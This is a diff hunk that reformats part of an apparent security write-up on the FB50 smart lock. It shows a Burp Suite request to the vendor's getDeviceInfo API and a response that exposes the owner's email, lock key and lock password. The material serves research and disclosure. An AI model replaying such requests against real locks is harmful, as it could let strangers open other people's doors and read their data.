@@ -54,33 +54,31 @@ We intercept the different requests being sent from the app which we will later 
 
 * We proceed to use the “Repeater” feature of Burpsuite to send requests directly to the FB50 smart lock
 * For example, we send the request 
-    '''
-    POST /oklock/lock/getDeviceInfo HTTP/1.1
-    User-Agent: nokelockTool/1.4.8(<DEVICE INFO>)
-    clientType: Android
-    token: <TOKEN>
-    language: US
-    appVersion: 1.4.8
-    Content-Type: application/json;charset=UTF-8
-    Content-Length: 56
-    Host: api.oklock.com.cn
-    Connection: close
-    Accept-Encoding: gzip, deflate
 
-    {"barcode":"https://app.oklok.com.cn/app.html?id=<BARCODE>"}
+      POST /oklock/lock/getDeviceInfo HTTP/1.1
+      User-Agent: nokelockTool/1.4.8(<DEVICE INFO>)
+      clientType: Android
+      token: <TOKEN>
+      language: US
+      appVersion: 1.4.8
+      Content-Type: application/json;charset=UTF-8
+      Content-Length: 56
+      Host: api.oklock.com.cn
+      Connection: close
+      Accept-Encoding: gzip, deflate
 
-      
+      {"barcode":"https://app.oklok.com.cn/app.html?id=<BARCODE>"}
+    
    * To which we get the follwing response
-   
-   '''
-    HTTP/1.1 200 
-    Server: nginx/1.13.3
-    Date: Sat, 21 Sep 2019 05:29:38 GMT
+                        
+         HTTP/1.1 200 
+         Server: nginx/1.13.3
+        Date: Sat, 21 Sep 2019 05:29:38 GMT
     Content-Type: application/json
     Content-Length: 409
     Connection: close
 
-{"result":{"account":"<USER EMAILID>","alarm":0,"barcode":"<BARCODE>","chipType":"1","createAt":"<DATE&TIME","deviceId":"","electricity":"91","firmwareVersion":"2.3","gsmVersion":"","id":<LOCKID>,"isLock":0,"lockKey":"40,1,61,18,20,24,18,8,52,57,36,96,91,1,87,20","lockPwd":"000000","mac":"<MAC ADDRESS>","name":"LOCK NAME","radioName":"BlueFPL","type":0,"userId":<USER ID>},"status":"2000"}
+    {"result":{"account":"<USER EMAILID>","alarm":0,"barcode":"<BARCODE>","chipType":"1","createAt":"   <DATE&TIME","deviceId":"","electricity":"91","firmwareVersion":"2.3","gsmVersion":"","id":<LOCKID>,"isLock":0,"lockKey":"40,1,61,18,20,24,18,8,52,57,36,96,91,1,87,20","lockPwd":"000000","mac":"<MAC ADDRESS>","name":"LOCK NAME","radioName":"BlueFPL","type":0,"userId":<USER ID>},"status":"2000"}
 
 
 
